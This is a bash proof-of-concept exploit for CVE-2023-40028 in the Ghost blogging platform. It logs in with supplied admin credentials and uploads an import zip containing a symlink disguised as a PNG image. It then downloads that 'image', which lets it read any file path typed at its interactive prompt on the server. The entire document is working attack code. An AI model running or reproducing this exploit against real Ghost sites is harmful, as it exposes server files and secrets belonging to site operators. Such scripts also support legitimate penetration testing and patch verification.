#!/bin/bash

GHOST_URL='http://127.0.0.1' #change this
GHOST_API="$GHOST_URL/ghost/api/v3/admin/"
API_VERSION='v3.0'

PAYLOAD_PATH="`dirname $0`/exploit"
PAYLOAD_ZIP_NAME=exploit.zip

# Function to print usage
function usage() {
  echo "Usage: $0 -u username -p password"
}

while getopts 'u:p:' flag; do
  case "${flag}" in
    u) USERNAME="${OPTARG}" ;;
    p) PASSWORD="${OPTARG}" ;;
    *) usage
       exit ;;
  esac
done

if [[ -z $USERNAME || -z $PASSWORD ]]; then
  usage
  exit
fi

function generate_exploit()
{
  local FILE_TO_READ=$1
  IMAGE_NAME=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13; echo)
  mkdir -p $PAYLOAD_PATH/content/images/2024/
  ln -s $FILE_TO_READ $PAYLOAD_PATH/content/images/2024/$IMAGE_NAME.png
  zip -r -y $PAYLOAD_ZIP_NAME $PAYLOAD_PATH/ &>/dev/null
}

function clean()
{
  rm $PAYLOAD_PATH/content/images/2024/$IMAGE_NAME.png
  rm -rf $PAYLOAD_PATH
  rm $PAYLOAD_ZIP_NAME
}

#CREATE COOKIE
curl -c cookie.txt -d username=$USERNAME -d password=$PASSWORD \
   -H "Origin: $GHOST_URL" \
   -H "Accept-Version: v3.0" \
   $GHOST_API/session/ &> /dev/null

if ! cat cookie.txt | grep -q ghost-admin-api-session;then
  echo "[!] INVALID USERNAME OR PASSWORD"
  rm cookie.txt
  exit
fi

function send_exploit()
{
  RES=$(curl -s -b cookie.txt \
  -H "Accept: text/plain, */*; q=0.01" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Accept-Encoding: gzip, deflate, br" \
  -H "X-Ghost-Version: 5.58" \
  -H "App-Pragma: no-cache" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Content-Type: multipart/form-data" \
  -X POST \
  -H "Origin: $GHOST_URL" \
  -H "Referer: $GHOST_URL/ghost/" \
  -F "importfile=@`dirname $PAYLOAD_PATH`/$PAYLOAD_ZIP_NAME;type=application/zip" \
  -H "form-data; name=\"importfile\"; filename=\"$PAYLOAD_ZIP_NAME\"" \
  -H "Content-Type: application/zip" \
  -J \
  "$GHOST_URL/ghost/api/v3/admin/db")
  if [ $? -ne 0 ];then
    echo "[!] FAILED TO SEND THE EXPLOIT"
    clean
    exit
  fi
}

echo "WELCOME TO THE CVE-2023-40028 SHELL"
while true; do
  read -p "file> " INPUT
  if [[ $INPUT == "exit" ]]; then
    echo "Bye Bye !"
    break
  fi
  if [[ $INPUT =~ \  ]]; then
    echo "PLEASE ENTER FULL FILE PATH WITHOUT SPACE"
    continue
  fi
  if [ -z $INPUT  ]; then
    echo "VALUE REQUIRED"
    continue
  fi
  generate_exploit $INPUT
  send_exploit
  curl -b cookie.txt -s $GHOST_URL/content/images/2024/$IMAGE_NAME.png
  clean
done

rm cookie.txt
